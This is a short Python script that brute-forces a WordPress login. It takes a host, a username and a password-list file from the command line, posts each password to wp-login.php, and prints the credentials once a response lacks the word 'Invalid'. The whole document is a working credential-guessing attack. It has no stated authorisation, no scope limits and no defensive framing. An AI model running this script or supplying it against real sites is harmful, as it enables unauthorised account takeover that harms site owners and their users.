# import lib
import requests
import sys

# assign  values based on script argument

host            = sys.argv[1]
user            = sys.argv[2]
passfile        = sys.argv[3]

# open the password file

with open(passfile, "r") as infile:
    # loop over each password aka each line in the file
    for line in infile:
        password = line.rstrip("\n")
        # Print curent password
        print("Trying: " + password)
        # make the login request
        resp = requests.post(host+'/wp-login.php', data = {'log':user, 'pwd': password})
        #If no Error aka we logged in, print the login values
        if "Invalid" not in resp.text:
            print("Login with user: " +user+" & pass: "+password)
            break
